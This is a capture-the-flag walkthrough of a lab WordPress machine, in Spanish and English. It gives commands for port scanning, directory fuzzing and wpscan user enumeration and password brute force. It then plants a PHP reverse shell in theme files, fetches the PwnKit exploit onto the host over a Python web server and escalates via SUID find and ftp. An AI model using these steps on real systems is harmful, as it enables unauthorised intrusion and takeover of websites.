  
Iniciamos la VPN
![[/Untitled 50.png|Untitled 50.png]]
![[/Untitled 1 9.png|Untitled 1 9.png]]
Iniciamos la máquina
![[/Untitled 2 10.png|Untitled 2 10.png]]
Comprobamos conectividad con la máquina
![[/Untitled 3 10.png|Untitled 3 10.png]]
Comenzamos con un escaneo para ver los puertos y servicios que están corriendo  
sudo nmap -p- --open -sS --min-rate 5000 -v -n -sV -Pn <IP_VÍCTIMA>  
[](https://www.notion.soundefined)
Vemos que esta corriendo un servicio web por el puerto 80(http) y un servicio ssh por el puerto 4512
Usamos la herramienta whatweb para ver que que podemos recopilar de la web antes de visitarla
whatweb -v [http://](http://10.10.181.113/)<IP_VÍCTIMA>
![[/Untitled 4 9.png|Untitled 4 9.png]]
![[/Untitled 5 9.png|Untitled 5 9.png]]
![[/Untitled 6 9.png|Untitled 6 9.png]]
Visitamos la web
![[/Untitled 7 9.png|Untitled 7 9.png]]
Vamos a hacer fuzzing para ver que directorios podemos encontrar
ffuf -u [http://10.10.214.40/FUZZ](http://10.10.214.40/FUZZ) -w directory-list-lowercase-2.3-big.txt -e .php,.html,.txt,.js
![[/Untitled 8 9.png|Untitled 8 9.png]]
![[/Untitled 9 9.png|Untitled 9 9.png]]
En /wp-includes encontramos
![[/Untitled 10 9.png|Untitled 10 9.png]]
  
  
En /wp-admin y /wp-login.php encontramos
![[/Untitled 11 9.png|Untitled 11 9.png]]
En /hidden encontramos
![[/Untitled 12 8.png|Untitled 12 8.png]]
  
Al encontrarnos con el CMS Wordpress podemos usar wpscan
NOTA:WPScan es una herramienta de seguridad especializada en escanear vulnerabilidades en sitios web que utilizan WordPress. Es ampliamente utilizada por profesionales de la seguridad, pentesters y administradores de sistemas para identificar posibles problemas de seguridad y vulnerabilidades en sus instalaciones de WordPress. WPScan es preinstalada en distribuciones de Linux orientadas a la seguridad, como Kali Linux.
  
Con wpscan hacemos una enumeración de usuarios y plugins vulnerables
❯ wpscan --url [http://10.10.214.40](http://10.10.214.40/) --enumerate u vp
![[/Untitled 13 8.png|Untitled 13 8.png]]
Encontramos los siguientes usuarios
![[/Untitled 14 7.png|Untitled 14 7.png]]
Ahora hacemos fuerza bruta a los usuarios con wpscan
❯ wpscan --url [http://10.10.214.40](http://10.10.214.40/) --passwords Passwords/rockyou.txt
![[/Untitled 15 6.png|Untitled 15 6.png]]
Encontramos la siguiente contraseña
![[/Untitled 16 6.png|Untitled 16 6.png]]
Probamos el usuario y la contraseña para ver si es accesible en el login que encontramos haciendo fuzzing
  
![[/Untitled 17 6.png|Untitled 17 6.png]]
Tenemos acceso con estas credenciales  
  
![[/Untitled 18 6.png|Untitled 18 6.png]]
  
Nos dirigimos al apartado Appearance
![[/Untitled 19 6.png|Untitled 19 6.png]]
  
En Header
![[/Untitled 20 6.png|Untitled 20 6.png]]
  
Podemos editar el header.php y añadirle una reverse shell en php para obtener acceso actualizando el home de la web
![[/Untitled 21 6.png|Untitled 21 6.png]]
  
![[/Untitled 22 6.png|Untitled 22 6.png]]
  
Nos ponemos a la escucha en el puerto asignado en la reverse shell (4444)
![[/Untitled 23 6.png|Untitled 23 6.png]]
  
Recargamos la web y obtenemos el acceso  
  
![[/Untitled 24 6.png|Untitled 24 6.png]]
TRATAMIENTO TTY→[https://invertebr4do.github.io/tratamiento-de-tty/#](https://invertebr4do.github.io/tratamiento-de-tty/#)
  
Hacemos una búsqueda de binarios con permisos SUID
![[/Untitled 25 6.png|Untitled 25 6.png]]
Sabemos que existe una vulnervilidad con este binario
![[/Untitled 26 6.png|Untitled 26 6.png]]
Nos descargamos el PwnKit en nuestra maquina  
  
`curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit`
![[/Untitled 27 6.png|Untitled 27 6.png]]
Montamos un servidor en python para acceder desde la reverse shell y descargarse el PwnKit
python3 -m http.server 8000
![[/Untitled 28 6.png|Untitled 28 6.png]]
Nos descargamos el Pwnkit desde la reverse shell
Para poder descargarlo lo hacemos desde /tmp porque tenemos permisos de escritura
curl -o PwnKit [http://10.9.2.24:8000/PwnKit](http://10.9.2.24:8000/PwnKit)
![[/Untitled 29 6.png|Untitled 29 6.png]]
Ejecutamos los comandos que nos indican en la documentación de github
![[/Untitled 30 6.png|Untitled 30 6.png]]
Ya somos root
Entregamos las flags
![[/Untitled 31 6.png|Untitled 31 6.png]]
![[/Untitled 32 6.png|Untitled 32 6.png]]
---
  
SECOND WAY TO ESCALATE PRIVILEGES
Once we have access to the administrator panel, we can go to the Appearance editor section.
  
![[/Untitled 33 6.png|Untitled 33 6.png]]
We modify this file and verify that we have remote command execution, as it interprets PHP
![[/Untitled 34 6.png|Untitled 34 6.png]]
We navigate to the modified file from the browser
![[/Untitled 35 6.png|Untitled 35 6.png]]
We have remote command execution. Let's modify the file adding a reverse shell
https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
![[/Untitled 36 5.png|Untitled 36 5.png]]
We start listening on the port assigned in the reverse shell(4444)
  
![[/Untitled 37 4.png|Untitled 37 4.png]]
Now we will reload the 404.php file from the web, and the reverse shell will execute
<IP_VICTIMA>/wp-content/themes/twentyfifteen/404.php
![[/Untitled 38 4.png|Untitled 38 4.png]]
/We search for binaries with SUID permissions
![[/Untitled 39 3.png|Untitled 39 3.png]]
We search GTFObins for the find binary with SUID permissions
![[/Untitled 40 3.png|Untitled 40 3.png]]
![[/Untitled 41 2.png|Untitled 41 2.png]]
We execute the command
![[/Untitled 42 2.png|Untitled 42 2.png]]
---
THIRD WAY TO ESCALATE PRIVILEGES
Once we have the reverse shell, we access /var/www/html
NOTE:The directory /var/www/html in Linux systems is commonly used to store files and data related to web content served by the HTTP server.
![[/Untitled 43 2.png|Untitled 43 2.png]]
cat wp-config.php
![[/Untitled 44 2.png|Untitled 44 2.png]]
Found the following
![[/Untitled 45 2.png|Untitled 45 2.png]]
  
We change sessions
![[/Untitled 46 2.png|Untitled 46 2.png]]
Now we can obtain the user flag
![[/Untitled 47 2.png|Untitled 47 2.png]]
echo "RmVsaWNpZGFkZXMsIHByaW1lciBuaXZlbCBjb25zZWd1aWRvIQ==" | base64 -d
![[/Untitled 48 2.png|Untitled 48 2.png]]
Privilege Escalation
![[/Untitled 49 2.png|Untitled 49 2.png]]
We search GTFOBins for ftp
![[/Untitled 50 2.png|Untitled 50 2.png]]
![[Untitled 51.png]]
We execute the commands
![[Untitled 52.png]]
We obtain the root flag
![[Untitled 53.png]]